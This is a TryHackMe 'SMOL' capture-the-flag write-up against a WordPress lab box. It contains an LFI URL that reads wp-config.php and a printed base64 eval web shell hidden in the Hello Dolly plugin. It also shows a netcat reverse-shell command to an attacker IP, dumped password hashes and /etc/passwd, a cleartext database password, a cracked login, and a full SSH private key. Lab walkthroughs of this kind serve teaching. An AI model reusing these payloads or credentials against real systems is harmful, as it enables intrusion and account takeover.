---
title: "TryHackMe: SMOL"
author: Neovirex
categories: [TryHackMe]
tags: [smol]
render_with_liquid: false
media_subpath: /images/tryhackme_smol/
image:
  path: room_img.webp
---
# SMOL

Created: March 6, 2025 1:35 AM
Status: Done

- Reconnaissance
    
    ```jsx
    $ nmap -sT -sV -sC -p 22,80 10.10.1.247 -T4
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 01:18 EST
    Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Service scan Timing: About 50.00% done; ETC: 01:18 (0:00:06 remaining)
    Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 91.93% done; ETC: 01:18 (0:00:00 remaining)
    Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 92.28% done; ETC: 01:18 (0:00:00 remaining)
    Nmap scan report for smol.thm (10.10.1.247)
    Host is up (0.40s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
    |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
    |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Did not follow redirect to http://www.smol.thm/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 50.88 seconds
    
    ```
    
- Service Enumeration
    
    add  the IP to the /etc/hosts to access the web interface 
    
    - web image
        
        ![Screenshot From 2025-03-06 01-39-24.png](img1.png)
        
    - try to FFUF  but no vhosts
        
        ```jsx
        $ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.1.247 -H "Host: FUZZ.smol.thm" -fw 1
        
         
        ```
        
- Web Application Analysis
    
    ![Screenshot From 2025-03-06 01-39-24.png](img1.png)
    
- Vulnerability Scanning
    - With WPScan
        
        ```jsx
        ─$ wpscan --url http://www.smol.thm --disable-tls-checks            
        
        _______________________________________________________________
                 __          _______   _____
                 \ \        / /  __ \ / ____|
                  \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
                   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                    \  /\  /  | |     ____) | (__| (_| | | | |
                     \/  \/   |_|    |_____/ \___|\__,_|_| |_|
        
                 WordPress Security Scanner by the WPScan Team
                                 Version 3.8.27
               Sponsored by Automattic - https://automattic.com/
               @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
        _______________________________________________________________
        
        [+] URL: http://www.smol.thm/ [10.10.149.172]
        [+] Started: Fri Mar  7 20:33:40 2025
        
        Interesting Finding(s):
        
        [+] Headers
         | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
         | Found By: Headers (Passive Detection)
         | Confidence: 100%
        
        [+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
         | Found By: Direct Access (Aggressive Detection)
         | Confidence: 100%
         | References:
         |  - http://codex.wordpress.org/XML-RPC_Pingback_API
         |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
         |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
         |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
         |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
        
        [+] WordPress readme found: http://www.smol.thm/readme.html
         | Found By: Direct Access (Aggressive Detection)
         | Confidence: 100%
        
        [+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
         | Found By: Direct Access (Aggressive Detection)
         | Confidence: 100%
        
        [+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
         | Found By: Direct Access (Aggressive Detection)
         | Confidence: 60%
         | References:
         |  - https://www.iplocation.net/defend-wordpress-from-ddos
         |  - https://github.com/wpscanteam/wpscan/issues/1299
        
        [+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
         | Found By: Rss Generator (Passive Detection)
         |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
         |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
        
        [+] WordPress theme in use: twentytwentythree
         | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
         | Last Updated: 2024-11-13T00:00:00.000Z
         | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
         | [!] The version is out of date, the latest version is 1.6
         | [!] Directory listing is enabled
         | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
         | Style Name: Twenty Twenty-Three
         | Style URI: https://wordpress.org/themes/twentytwentythree
         | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
         | Author: the WordPress team
         | Author URI: https://wordpress.org
         |
         | Found By: Urls In Homepage (Passive Detection)
         |
         | Version: 1.2 (80% confidence)
         | Found By: Style (Passive Detection)
         |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'
        
        [+] Enumerating All Plugins (via Passive Methods)
        [+] Checking Plugin Versions (via Passive and Aggressive Methods)
        
        [i] Plugin(s) Identified:
        
        [+] jsmol2wp
         | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
         | Latest Version: 1.07 (up to date)
         | Last Updated: 2018-03-09T10:28:00.000Z
         |
         | Found By: Urls In Homepage (Passive Detection)
         |
         | Version: 1.07 (100% confidence)
         | Found By: Readme - Stable Tag (Aggressive Detection)
         |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
         | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
         |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
        
        [+] Enumerating Config Backups (via Passive and Aggressive Methods)
         Checking Config Backups - Time: 00:00:12 <===================================================================> (137 / 137) 100.00% Time: 00:00:12
        
        [i] No Config Backups Found.
        
        [!] No WPScan API Token given, as a result vulnerability data has not been output.
        [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
        
        [+] Finished: Fri Mar  7 20:34:08 2025
        [+] Requests Done: 171
        [+] Cached Requests: 5
        [+] Data Sent: 43.542 KB
        [+] Data Received: 248.73 KB
        [+] Memory used: 274.953 MB
        [+] Elapsed time: 00:00:28
                                        
        ```
        
    - **Web Access - wpuser   ;;    We use the SSRF example payload, read the wp-config and find the credentials for the database user wpuser.**
        
        [http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php)
        
        ```jsx
        http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
        ```
        
        - **the data in text and image inside the URL**
            
            ```jsx
            <?php
            /**
             * The base configuration for WordPress
             *
             * The wp-config.php creation script uses this file during the installation.
             * You don't have to use the web site, you can copy this file to "wp-config.php"
             * and fill in the values.
             *
             * This file contains the following configurations:
             *
             * * Database settings
             * * Secret keys
             * * Database table prefix
             * * ABSPATH
             *
             * @link https://wordpress.org/documentation/article/editing-wp-config-php/
             *
             * @package WordPress
             */
            
            // ** Database settings - You can get this info from your web host ** //
            /** The name of the database for WordPress */
            define( 'DB_NAME', 'wordpress' );
            
            /** Database username */
            define( 'DB_USER', 'wpuser' );
            
            /** Database password */
            define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
            
            /** Database hostname */
            define( 'DB_HOST', 'localhost' );
            
            /** Database charset to use in creating database tables. */
            define( 'DB_CHARSET', 'utf8' );
            
            /** The database collate type. Don't change this if in doubt. */
            define( 'DB_COLLATE', '' );
            
            /**#@+
             * Authentication unique keys and salts.
             *
             * Change these to different unique phrases! You can generate these using
             * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
             *
             * You can change these at any point in time to invalidate all existing cookies.
             * This will force all users to have to log in again.
             *
             * @since 2.6.0
             */
            define( 'AUTH_KEY',         'put your unique phrase here' );
            define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
            define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
            define( 'NONCE_KEY',        'put your unique phrase here' );
            define( 'AUTH_SALT',        'put your unique phrase here' );
            define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
            define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
            define( 'NONCE_SALT',       'put your unique phrase here' );
            
            /**#@-*/
            
            /**
             * WordPress database table prefix.
             *
             * You can have multiple installations in one database if you give each
             * a unique prefix. Only numbers, letters, and underscores please!
             */
            $table_prefix = 'wp_';
            
            /**
             * For developers: WordPress debugging mode.
             *
             * Change this to true to enable the display of notices during development.
             * It is strongly recommended that plugin and theme developers use WP_DEBUG
             * in their development environments.
             *
             * For information on other constants that can be used for debugging,
             * visit the documentation.
             *
             * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
             */
            define( 'WP_DEBUG', false );
            
            /* Add any custom values between this line and the "stop editing" line. */
            
            /* That's all, stop editing! Happy publishing. */
            
            /** Absolute path to the WordPress directory. */
            if ( ! defined( 'ABSPATH' ) ) {
            	define( 'ABSPATH', __DIR__ . '/' );
            }
            
            /** Sets up WordPress vars and included files. */
            require_once ABSPATH . 'wp-settings.php';
            
            ```
            
            ![Screenshot From 2025-03-06 01-57-10.png](img2.png)
            
    
    ## **Web Access - wpuser**
    
    - And find the **username and password**
        
        ```jsx
        /** Database username */
        define( 'DB_USER', 'wpuser' );
        
        /** Database password */
        define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
        ```
        
    - login
        
        ![Screenshot From 2025-03-07 20-38-05.png](img3.png)
        
        ![Screenshot From 2025-03-07 20-38-35.png](img4.png)
        
        ![Screenshot From 2025-03-07 20-38-49.png](img5.png)
        
    - **We use the SSRF vulnerability again and read the hello.php file.hint** [https://github.com/WordPress/hello-dolly/tree/trunk](https://github.com/WordPress/hello-dolly/tree/trunk)
        
        ```jsx
        http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
        ```
        
    - result
        
        ```jsx
        <?php
        /**
         * @package Hello_Dolly
         * @version 1.7.2
         */
        /*
        Plugin Name: Hello Dolly
        Plugin URI: http://wordpress.org/plugins/hello-dolly/
        Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
        Author: Matt Mullenweg
        Version: 1.7.2
        Author URI: http://ma.tt/
        */
        
        function hello_dolly_get_lyric() {
        	/** These are the lyrics to Hello Dolly */
        	$lyrics = "Hello, Dolly
        Well, hello, Dolly
        It's so nice to have you back where you belong
        You're lookin' swell, Dolly
        I can tell, Dolly
        You're still glowin', you're still crowin'
        You're still goin' strong
        I feel the room swayin'
        While the band's playin'
        One of our old favorite songs from way back when
        So, take her wrap, fellas
        Dolly, never go away again
        Hello, Dolly
        Well, hello, Dolly
        It's so nice to have you back where you belong
        You're lookin' swell, Dolly
        I can tell, Dolly
        You're still glowin', you're still crowin'
        You're still goin' strong
        I feel the room swayin'
        While the band's playin'
        One of our old favorite songs from way back when
        So, golly, gee, fellas
        Have a little faith in me, fellas
        Dolly, never go away
        Promise, you'll never go away
        Dolly'll never go away again";
        
        	// Here we split it into lines.
        	$lyrics = explode( "\n", $lyrics );
        
        	// And then randomly choose a line.
        	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
        }
        
        // This just echoes the chosen line, we'll position it later.
        function hello_dolly() {
        	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
        	
        	$chosen = hello_dolly_get_lyric();
        	$lang   = '';
        	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
        		$lang = ' lang="en"';
        	}
        
        	printf(
        		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
        		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
        		$lang,
        		$chosen
        	);
        }
        
        // Now we set that function up to execute when the admin_notices action is called.
        add_action( 'admin_notices', 'hello_dolly' );
        
        // We need some CSS to position the paragraph.
        function dolly_css() {
        	echo "
        	<style type='text/css'>
        	#dolly {
        		float: right;
        		padding: 5px 10px;
        		margin: 0;
        		font-size: 12px;
        		line-height: 1.6666;
        	}
        	.rtl #dolly {
        		float: left;
        	}
        	.block-editor-page #dolly {
        		display: none;
        	}
        	@media screen and (max-width: 782px) {
        		#dolly,
        		.rtl #dolly {
        			float: none;
        			padding-left: 0;
        			padding-right: 0;
        		}
        	}
        	</style>
        	";
        }
        
        add_action( 'admin_head', 'dolly_css' );
        
        ```
        
    - the base64 decrepit
        
        hash CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsg
        
        decrepit
        
        if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
        
    - it is a command check it in chatgpt
        
        The code you posted is a **PHP web shell**, which allows an attacker to execute system commands remotely through a URL parameter. Let's break it down:
        
- Exploit & Initial Access
    - make my own code using **https://www.revshells.com/ make it busybox nc -e , base64 and bin/bash**
        
        ![Screenshot From 2025-03-07 20-54-30.png](img6.png)
        
    - **Start a listener**
        
        ```jsx
        nc -lvnp 4445
        ```
        
        after “**connect to [10.2.26.145] from (UNKNOWN) [10.10.149.172] 59206**” type ls and this command to get reverse shell  >> 
        
        ```jsx
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        ```
        
        ```jsx
        └─$ nc -lvnp 4445
        listening on [any] 4445 ...
        connect to [10.2.26.145] from (UNKNOWN) [10.10.149.172] 59206
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        www-data@smol:/var/www/wordpress/wp-admin$ 
        ```
        
    - in login in to the page and change the URL to RUN the command
        
        [http://www.smol.thm/wp-admin/index.php?cmd=echo](http://www.smol.thm/wp-admin/index.php?cmd=echo) YnVzeWJveCBuYyAxMC4xNC45MC4yMzUgNDQ0NSAtZSAvYmluL2Jhc2g= | base64 -d | bash
        
- Privilege Escalation
    - To gain user access >>   mysql -u wpuser -p
        
        ```jsx
        mysql -u wpuser -p
        ```
        
        Password= kbLSF2Vop#lw3rjDZ629*Z%G
        
        ```jsx
        www-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser
        mysql -u wpuser
        ERROR 1045 (28000): Access denied for user 'wpuser'@'localhost' (using password: NO)
        www-data@smol:/var/www/wordpress/wp-admin$ mysql -u wpuser -p
        mysql -u wpuser -p
        Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
        
        Welcome to the MySQL monitor.  Commands end with ; or \g.
        Your MySQL connection id is 4162
        Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
        
        Copyright (c) 2000, 2024, Oracle and/or its affiliates.
        
        Oracle is a registered trademark of Oracle Corporation and/or its
        affiliates. Other names may be trademarks of their respective
        owners.
        
        Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
        
        mysql> 
        
        ```
        
    - **CMD >>> show databases;**
        
        ```jsx
        mysql> show databases;
        show databases;
        +--------------------+
        | Database           |
        +--------------------+
        | information_schema |
        | mysql              |
        | performance_schema |
        | sys                |
        | wordpress          |
        +--------------------+
        5 rows in set (0.00 sec)
        
        mysql> 
        
        ```
        
    - **CMD >>> SELECT * FROM wp_users;**
        
        ```jsx
        mysql> SELECT * FROM wp_users;
        SELECT * FROM wp_users;
        +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
        | ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
        +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
        |  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
        |  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
        |  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
        |  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
        |  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
        |  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
        +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
        6 rows in set (0.00 sec)
        
        mysql> 
        
        ```
        
    - going back to the www-data@smol and run **CMD >>>  cat /etc/passwd**
        
        ```jsx
        www-data@smol:/var/www/wordpress/wp-admin$ cat /etc/passwd
        cat /etc/passwd
        root:x:0:0:root:/root:/usr/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
        systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
        systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
        messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
        syslog:x:104:110::/home/syslog:/usr/sbin/nologin
        _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
        tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
        uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
        tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
        landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
        pollinate:x:110:1::/var/cache/pollinate:/bin/false
        usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
        sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
        systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
        lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
        think:x:1000:1000:,,,:/home/think:/bin/bash
        fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
        mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
        xavi:x:1001:1001::/home/xavi:/bin/bash
        diego:x:1002:1002::/home/diego:/bin/bash
        gege:x:1003:1003::/home/gege:/bin/bash
        www-data@smol:/var/www/wordpress/wp-admin$
        ```
        
    - cracking admin passwords
        
        admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm
        
        **password =** sandiegocalifornia
        
    - login in **user diego**
        
        ```jsx
        www-data@smol:/home$ su diego
        su diego
        Password: sandiegocalifornia
        
        diego@smol:/home$ ls
        ls
        diego  gege  think  xavi
        diego@smol:/home$ cd diego
        cd diego
        diego@smol:~$ ls
        ls
        user.txt
        diego@smol:~$ cat user.txt
        cat user.txt
        45edaec653ff9ee06236b7ce72b86963
        diego@smol:~$ 
        
        ```
        
- Lateral Movement
    - movement
        
        ```jsx
        diego@smol:~$ ls -lah
        ls -lah
        total 24K
        drwxr-x--- 2 diego internal 4.0K Aug 18  2023 .
        drwxr-xr-x 6 root  root     4.0K Aug 16  2023 ..
        lrwxrwxrwx 1 root  root        9 Aug 18  2023 .bash_history -> /dev/null
        -rw-r--r-- 1 diego diego     220 Feb 25  2020 .bash_logout
        -rw-r--r-- 1 diego diego    3.7K Feb 25  2020 .bashrc
        -rw-r--r-- 1 diego diego     807 Feb 25  2020 .profile
        -rw-r--r-- 1 root  root       33 Aug 16  2023 user.txt
        lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
        diego@smol:~$ cd home
        cd home
        bash: cd: home: No such file or directory
        diego@smol:~$ cd \home
        cd \home
        bash: cd: home: No such file or directory
        diego@smol:~$ cd /home
        cd /home
        diego@smol:/home$ ls
        ls
        diego  gege  think  xavi
        diego@smol:/home$ ls -lah
        ls -lah
        total 24K
        drwxr-xr-x  6 root  root     4.0K Aug 16  2023 .
        drwxr-xr-x 18 root  root     4.0K Mar 29  2024 ..
        drwxr-x---  2 diego internal 4.0K Aug 18  2023 diego
        drwxr-x---  2 gege  internal 4.0K Aug 18  2023 gege
        drwxr-x---  5 think internal 4.0K Jan 12  2024 think
        drwxr-x---  2 xavi  internal 4.0K Aug 18  2023 xavi
        diego@smol:/home$ id
        id
        uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
        diego@smol:/home$ cd think/ 
        cd think/
        diego@smol:/home/think$ ls -lah
        ls -lah
        total 32K
        drwxr-x--- 5 think internal 4.0K Jan 12  2024 .
        drwxr-xr-x 6 root  root     4.0K Aug 16  2023 ..
        lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
        -rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
        -rw-r--r-- 1 think think    3.7K Jun  2  2023 .bashrc
        drwx------ 2 think think    4.0K Jan 12  2024 .cache
        drwx------ 3 think think    4.0K Aug 18  2023 .gnupg
        -rw-r--r-- 1 think think     807 Jun  2  2023 .profile
        drwxr-xr-x 2 think think    4.0K Jun 21  2023 .ssh
        lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
        diego@smol:/home/think$ cd .ssh/
        cd .ssh/
        diego@smol:/home/think/.ssh$ ls
        ls
        authorized_keys  id_rsa  id_rsa.pub
        diego@smol:/home/think/.ssh$ cat id_rsa
        cat id_rsa
        -----BEGIN OPENSSH PRIVATE KEY-----
        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
        -----END OPENSSH PRIVATE KEY-----
        diego@smol:/home/think/.ssh$ 
        
        ```
        
    - ssh key
        
        ```jsx
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
        NhAAAAAwEAAQAAAYEAxGtoQjY5NUymuD+3b0xzEYIhdBbsnicrrnvkMjOgdbp8xYKrfOgM
        ehrkrEXjcqmrFvZzp0hnVnbaCyUV8vDrywsrEivK7d5IDefssH/RqRinOY3FEYE+ekzKoH
        +S6+jNEKedMH7DamLsXxsAG5b/Avm+FpWmvN1yS5sTeCeYU0wsHMP+cfM1cYcDkDU6HmiC
        A2G4D5+uPluSH13TS12JpFyU3EjHQvV6evERecriHSfV0PxMrrwJEyOwSPYA2c7RlYh+tb
